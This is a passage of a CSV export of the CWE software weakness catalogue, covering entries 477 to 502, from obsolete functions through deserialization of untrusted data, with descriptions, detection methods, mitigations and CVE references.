Dereference)::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A9:ENTRY NAME:Denial of Service:MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:EXP34-C:ENTRY NAME:Do not dereference null pointers:MAPPING FIT:Exact::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP7:ENTRY NAME:Faulty Pointer Use::\",,\"\",\n477,\"Use of Obsolete Function\",Base,Draft,\"The code uses deprecated or obsolete functions, which suggests that the code has not been actively reviewed or maintained.\",\"As programming languages evolve, functions occasionally become obsolete due to: Advances in the language Improved understanding of how operations should be performed effectively and securely Changes in the conventions that govern certain operations Functions that are removed are usually replaced by newer counterparts that perform the same task in some different and hopefully improved way.\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Quality Degradation::\",\"::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Binary / Bytecode Quality Analysis Cost effective for partial coverage: Bytecode Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Debugger:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source Code Quality Analyzer Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Automated Static Analysis:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Origin Analysis:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Refer to the documentation for the obsolete function in order to determine why it is deprecated or obsolete and to learn about alternative ways to achieve the same functionality.::PHASE:Requirements:DESCRIPTION:Consider seriously the security implications of using an obsolete function. Consider using alternate functions.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Obsolete::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP3:ENTRY NAME:Use of an improper API::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:DCL30-PL:ENTRY NAME:Do not import deprecated modules:MAPPING FIT:CWE More Specific::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:EXP30-PL:ENTRY NAME:Do not use deprecated or obsolete functions or modules:MAPPING FIT:CWE More Specific::\",,\"\",\n478,\"Missing Default Case in Multiple Condition Expression\",Base,Draft,\"The code does not have a default case in an expression with multiple conditions, such as a switch statement.\",\"If a multiple-condition expression (such as a switch in C) omits the default case but does not consider or handle all possible values that could occur, then this might lead to complex logical errors and resultant weaknesses. Because of this, further decisions are made based on poor information, and cascading failure results. This cascading failure may result in any number of security issues, and constitutes a significant failure in the system.\",::NATURE:ChildOf:CWE ID:1023:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C#:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Python:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:JavaScript:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Varies by Context:IMPACT:Alter Execution Logic:NOTE:Depending on the logical circumstances involved, any consequences may result: e.g., issues of confidentiality, authentication, authorization, availability, integrity, accountability, or non-repudiation.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Ensure that there are no cases unaccounted for when adjusting program flow or values based on the value of a given variable. In the case of switch style statements, the very simple act of creating a default case can, if done correctly, mitigate this situation. Often however, the default case is used simply to represent an assumed option, as opposed to working as a check for invalid input. This is poor practice and in some cases is as bad as omitting a default case entirely.::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Failure to account for default case in switch::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP4:ENTRY NAME:Unchecked Status Condition::\",,\"\",\n480,\"Use of Incorrect Operator\",Base,Draft,\"The product accidentally uses the wrong operator, which changes the logic in security-relevant ways.\",\"These types of errors are generally the result of a typo by the programmer.\",::NATURE:ChildOf:CWE ID:670:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Sometimes::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Sometimes::LANGUAGE NAME:Perl:LANGUAGE PREVALENCE:Sometimes::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Alter Execution Logic:NOTE:This weakness can cause unintended logic to be executed and other unexpected application behavior.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:This weakness can be found easily using static analysis. However in some cases an operator might appear to be incorrect, but is actually correct and reflects unusual logic within the program.::METHOD:Manual Static Analysis:DESCRIPTION:This weakness can be found easily using static analysis. However in some cases an operator might appear to be incorrect, but is actually correct and reflects unusual logic within the program.::\",\"\",\"::REFERENCE:CVE-2022-3979:DESCRIPTION:Chain: data visualization program written in PHP uses the != operator instead of the type-strict !== operator (CWE-480) when validating hash values, potentially leading to an incorrect type conversion (CWE-704):LINK:https://www.cve.org/CVERecord?id=CVE-2022-3979::REFERENCE:CVE-2021-3116:DESCRIPTION:Chain: Python-based HTTP Proxy server uses the wrong boolean operators (CWE-480) causing an incorrect comparison (CWE-697) that identifies an authN failure if all three conditions are met instead of only one, allowing bypass of the proxy authentication (CWE-1390):LINK:https://www.cve.org/CVERecord?id=CVE-2021-3116::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Using the wrong operator::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:EXP45-C:ENTRY NAME:Do not perform assignments in selection statements:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:EXP46-C:ENTRY NAME:Do not use a bitwise operator with a Boolean-like operand:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP1:ENTRY NAME:Glitch in Computation::\",,\"\",\n483,\"Incorrect Block Delimitation\",Base,Draft,\"The code does not explicitly delimit a block that is intended to contain 2 or more statements, creating a logic error.\",\"In some languages, braces (or other delimiters) are optional for blocks. When the delimiter is omitted, it is possible to insert a logic error in which a statement is thought to be in a block but is not. In some cases, the logic error can have security implications.\",::NATURE:ChildOf:CWE ID:670:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::ORDINALITY:Indirect::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Sometimes::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Sometimes::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Alter Execution Logic:NOTE:This is a general logic error which will often lead to obviously-incorrect behaviors that are quickly noticed and fixed. In lightly tested or untested code, this error may be introduced it into a production environment and provide additional attack vectors by creating a control flow path leading to an unexpected state in the application. The consequences will depend on the types of behaviors that are being incorrectly executed.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Always use explicit block delimitation and use static-analysis technologies to enforce this practice.::\",\"::REFERENCE:CVE-2014-1266:DESCRIPTION:incorrect indentation of goto statement makes it more difficult to detect an incorrect goto (Apple's goto fail):LINK:https://www.cve.org/CVERecord?id=CVE-2014-1266::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Incorrect block delimitation::\",,\"\",\n484,\"Omitted Break Statement in Switch\",Base,Draft,\"The product omits a break statement within a switch or similar construct, causing code associated with multiple conditions to execute. This can cause problems when the programmer only intended to execute code associated with one condition.\",\"This can lead to critical code executing in situations where it should not.\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:670:VIEW ID:1000::,\"::ORDINALITY:Primary::ORDINALITY:Indirect::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C#:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:PHP:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Alter Execution Logic:NOTE:This weakness can cause unintended logic to be executed and other unexpected application behavior.::\",\"::METHOD:White Box:DESCRIPTION:Omission of a break statement might be intentional, in order to support fallthrough. Automated detection methods might therefore be erroneous. Semantic understanding of expected product behavior is required to interpret whether the code is correct.::METHOD:Black Box:DESCRIPTION:Since this weakness is associated with a code construct, it would be indistinguishable from other errors that produce the same behavior.::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Omitting a break statement so that one may fall through is often indistinguishable from an error, and therefore should be avoided. If you need to use fall-through capabilities, make sure that you have clearly documented this within the switch statement, and ensure that you have examined all the logical possibilities.::PHASE:Implementation:DESCRIPTION:The functionality of omitting a break statement could be clarified with an if statement. This method is much safer.::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Omitted break statement::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP4:ENTRY NAME:Unchecked Status Condition::\",,\"\",\n487,\"Reliance on Package-level Scope\",Base,Incomplete,\"Java packages are not inherently closed; therefore, relying on them for code security is not a good practice.\",\"The purpose of package scope is to prevent accidental access by other parts of a program. This is an ease-of-software-development feature but not a security feature.\",::NATURE:ChildOf:CWE ID:664:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:Any data in a Java package can be accessed outside of the Java framework if the package is distributed.::SCOPE:Integrity:IMPACT:Modify Application Data:NOTE:The data in a Java class can be modified by anyone outside of the Java framework if the packages is distributed.::\",\"\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Data should be private static and final whenever possible. This will assure that your code is protected by instantiating early, preventing access and tampering.::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Relying on package-level scope::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:MET04-J:ENTRY NAME:Do not increase the accessibility of overridden or hidden methods::\",,\"\",\n488,\"Exposure of Data Element to Wrong Session\",Base,Draft,\"The product does not sufficiently enforce boundaries between the states of different sessions, causing data to be provided to, or used by, the wrong session.\",\"Data can bleed from one session to another through member variables of singleton objects, such as Servlets, and objects from a shared pool. In the case of Servlets, developers sometimes do not understand that, unless a Servlet implements the SingleThreadModel interface, the Servlet is a singleton; there is only one instance of the Servlet, and that single instance is used and re-used to handle multiple requests that are processed simultaneously by different threads. A common result is that developers use Servlet member fields in such a way that one user may inadvertently see another user's data. In other words, storing user data in Servlet member fields introduces a data access race condition.\",::NATURE:ChildOf:CWE ID:668:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Protect the application's sessions from information leakage. Make sure that a session's data is not used or visible by other sessions.::PHASE:Testing:DESCRIPTION:Use a static analysis tool to scan the code for information leakage vulnerabilities (e.g. Singleton Member Field).::PHASE:Architecture and Design:DESCRIPTION:In a multithreading environment, storing user data in Servlet member fields introduces a data access race condition. Do not use member fields to store information in the Servlet.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Data Leaking Between Users::\",::59::60::,\"\",\n489,\"Active Debug Code\",Base,Draft,\"The product is deployed to unauthorized actors with debugging code still enabled or active, which can create unintended entry points or expose sensitive information.\",\"A common development practice is to add back door code specifically designed for debugging or testing purposes that is not intended to be shipped or deployed with the product. These back door entry points create security risks because they are not considered during design or testing and fall outside of the expected operating conditions of the product.\",::NATURE:ChildOf:CWE ID:710:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:215:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Indirect::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"::TERM:Leftover debug code:DESCRIPTION:This term originates from Seven Pernicious Kingdoms::\",\"::PHASE:Implementation:NOTE:In web-based applications, debug code is used to test and modify web application properties, configuration information, and functions. If a debug application is left on a production server, this oversight during the software process allows attackers access to debug functionality.::PHASE:Build and Compilation::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:SCOPE:Other:IMPACT:Bypass Protection Mechanism:IMPACT:Read Application Data:IMPACT:Gain Privileges or Assume Identity:IMPACT:Varies by Context:NOTE:The severity of the exposed debug application will depend on the particular instance. At the least, it will give an attacker sensitive information about the settings and mechanics of web applications on the server. At worst, as is often the case, the debug application will allow an attacker complete control over the web application and server, as well as confidential information that either of these access.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Build and Compilation Distribution:DESCRIPTION:Remove debug code before deploying the application.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Leftover Debug Code::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A10:ENTRY NAME:Insecure Configuration Management:MAPPING FIT:CWE More Specific::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP28:ENTRY NAME:Unexpected access points::\",::121::661::,\"::TYPE:Other:NOTE:In J2EE a main method may be a good indicator that debug code has been left in the application, although there may not be any direct security impact.::\",\n494,\"Download of Code Without Integrity Check\",Base,Draft,\"The product downloads source code or an executable from a remote location and executes the code without sufficiently verifying the origin and integrity of the code.\",\"An attacker can execute malicious code by compromising the host server, performing DNS spoofing, or modifying the code in transit.\",::NATURE:ChildOf:CWE ID:345:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:669:VIEW ID:1000::NATURE:ChildOf:CWE ID:669:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Availability:SCOPE:Confidentiality:SCOPE:Other:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Alter Execution Logic:IMPACT:Other:NOTE:Executing untrusted code could compromise the control flow of the program. The untrusted code could execute attacker-controlled commands, read or modify sensitive resources, or prevent the software from functioning correctly for legitimate users.::\",\"::METHOD:Manual Analysis:DESCRIPTION:This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. Specifically, manual static analysis is typically required to find the behavior that triggers the download of code, and to determine whether integrity-checking methods are in use.::METHOD:Black Box:DESCRIPTION:Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic. Attach the monitor to the process and also sniff the network connection. Trigger features related to product updates or plugin installation, which is likely to force a code download. Monitor when files are downloaded and separately executed, or if they are otherwise read back into the process. Look for evidence of cryptographic library calls that use integrity checking.::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Perform proper forward and reverse DNS lookups to detect DNS spoofing.::PHASE:Architecture and Design Operation:DESCRIPTION:Encrypt the code with a reliable encryption scheme before transmitting. This will only be a partial solution, since it will not detect DNS spoofing and it will not prevent your code from being modified on the hosting site.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. Speficially, it may be helpful to use tools or frameworks to perform integrity checking on the transmitted code. When providing the code that is to be downloaded, such as for automatic updates of the software, then use cryptographic signatures for the code and modify the download clients to verify the signatures. Ensure that the implementation does not contain CWE-295, CWE-320, CWE-347, and related weaknesses. Use code signing technologies such as Authenticode. See references [REF-454] [REF-455] [REF-456].::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Architecture and Design Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.:EFFECTIVENESS:Limited::\",\"::REFERENCE:CVE-2019-9534:DESCRIPTION:Satellite phone does not validate its firmware image.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-9534::REFERENCE:CVE-2021-22909:DESCRIPTION:Chain: router's firmware update procedure uses curl with -k (insecure) option that disables certificate validation (CWE-295), allowing adversary-in-the-middle (AITM) compromise with a malicious firmware image (CWE-494).:LINK:https://www.cve.org/CVERecord?id=CVE-2021-22909::REFERENCE:CVE-2008-3438:DESCRIPTION:OS does not verify authenticity of its own updates.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3438::REFERENCE:CVE-2008-3324:DESCRIPTION:online poker client does not verify authenticity of its own updates.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3324::REFERENCE:CVE-2001-1125:DESCRIPTION:anti-virus product does not verify automatic updates for itself.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1125::REFERENCE:CVE-2002-0671:DESCRIPTION:VOIP phone downloads applications from web sites without verifying integrity.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0671::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Invoking untrusted mobile code::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SEC06-J:ENTRY NAME:Do not rely on the default automatic signature verification provided by URLClassLoader and java.util.jar::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP27:ENTRY NAME:Tainted input to environment::\",::184::185::186::187::533::538::657::662::691::692::693::695::,\"::TYPE:Research Gap:NOTE:This is critical for mobile code, but it is likely to become more and more common as developers continue to adopt automated, network-based product distributions and upgrades. Software-as-a-Service (SaaS) might introduce additional subtleties. Common exploitation scenarios may include ad server compromises and bad upgrades.::\",\n497,\"Exposure of Sensitive System Information to an Unauthorized Control Sphere\",Base,Incomplete,\"The product does not properly prevent sensitive system-level information from being accessed by unauthorized actors who do not have the same level of access to the underlying system as the product does.\",\"Network-based products, such as web applications, often run on top of an operating system or similar environment. When the product communicates with outside parties, details about the underlying system are expected to remain hidden, such as path names for data files, other OS users, installed packages, the application environment, etc. This system information may be provided by the product itself, or buried within diagnostic or debugging messages. Debugging information helps an adversary learn about the system and form an attack plan. An information exposure occurs when system data or debugging information leaves the program through an output stream or logging function that makes it accessible to unauthorized parties. Using other weaknesses, an attacker could cause errors to occur; the response to these errors can reveal detailed system information, along with other impacts. An attacker can use messages that reveal technologies, operating systems, and product versions to tune the attack against known vulnerabilities in these technologies. A product may use diagnostic methods that provide significant implementation details such as stack traces as part of its error handling mechanism.\",::NATURE:ChildOf:CWE ID:200:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Production applications should never use methods that generate internal details such as stack traces and error messages unless that information is directly committed to a log that is not viewable by the end user. All error message text should be HTML entity encoded before being written to the log file to protect against potential cross-site scripting attacks against the viewer of the logs::\",\"::REFERENCE:CVE-2021-32638:DESCRIPTION:Code analysis product passes access tokens as a command-line parameter or through an environment variable, making them visible to other processes via the ps command.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-32638::\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:System Information Leak::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:ERR01-J:ENTRY NAME:Do not allow exceptions to expose sensitive information::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::\",::170::694::,\"\",\n501,\"Trust Boundary Violation\",Base,Draft,\"The product mixes trusted and untrusted data in the same data structure or structured message.\",\"A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted. On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data to safely cross the trust boundary - to move from untrusted to trusted. A trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted. By combining trusted and untrusted data in the same data structure, it becomes easier for programmers to mistakenly trust unvalidated data.\",::NATURE:ChildOf:CWE ID:664:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Trust Boundary Violation::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::\",,\"\",\n502,\"Deserialization of Untrusted Data\",Base,Draft,\"The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.\",\"It is often convenient to serialize objects for communication or to save them for later use. However, deserialized data or code can often be modified without using the provided accessor functions if it does not use cryptography to protect itself. Furthermore, any cryptography would still be client-side security -- which is a dangerous security assumption. Data that is untrusted can not be trusted to be well-formed. When developers place no restrictions on gadget chains, or series of instances and method invocations that can self-execute during the deserialization process (i.e., before the object is returned to the caller), it is sometimes possible for attackers to leverage them to perform unauthorized actions, like generating a shell.\",::NATURE:ChildOf:CWE ID:913:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:913:VIEW ID:1003:ORDINAL:Primary::NATURE:PeerOf:CWE ID:915:VIEW ID:1000::,\"\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Ruby:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:PHP:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Python:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:JavaScript:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Often::,\"::Serialization and deserialization refer to the process of taking program-internal object-related data, packaging it in a way that allows the data to be externally stored or transferred (serialization), then extracting the serialized data to reconstruct the original object (deserialization).::\",\"::TERM:Marshaling, Unmarshaling:DESCRIPTION:Marshaling and unmarshaling are effectively synonyms for serialization and deserialization, respectively.::TERM:Pickling, Unpickling:DESCRIPTION:In Python, the pickle functionality is used to perform serialization and deserialization.::TERM:PHP Object Injection:DESCRIPTION:Some PHP application researchers use this term when attacking unsafe use of the unserialize() function; but it is also used for CWE-915.::\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Modify Application Data:IMPACT:Unexpected State:NOTE:Attackers can modify unexpected objects or data that was assumed to be safe from modification.::SCOPE:Availability:IMPACT:DoS: Resource Consumption (CPU):NOTE:If a function is making an assumption on when to terminate, based on a sentry in a string, it could easily never terminate.::SCOPE:Other:IMPACT:Varies by Context:NOTE:The consequences can vary widely, because it depends on which objects or methods are being deserialized, and how they are used. Making an assumption that the code in the deserialized object is valid is dangerous and can enable exploitation.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified.::PHASE:Implementation:DESCRIPTION:When deserializing data, populate a new object rather than just deserializing. The result is that the data flows through safe input validation and that the functions are safe.::PHASE:Implementation:DESCRIPTION:Explicitly define a final object() to prevent deserialization.::PHASE:Architecture and Design Implementation:DESCRIPTION:Make fields transient to protect them from deserialization. An attempt to serialize and then deserialize a class containing transient fields will result in NULLs where the transient data should be. This is an excellent way to prevent time, environment-based, or sensitive variables from being carried over and used improperly.::PHASE:Implementation:DESCRIPTION:Avoid having unnecessary types or gadgets available that can be leveraged for malicious ends. This limits the potential for unintended or unauthorized types and gadgets to be leveraged by the attacker. Add only acceptable classes to an allowlist. 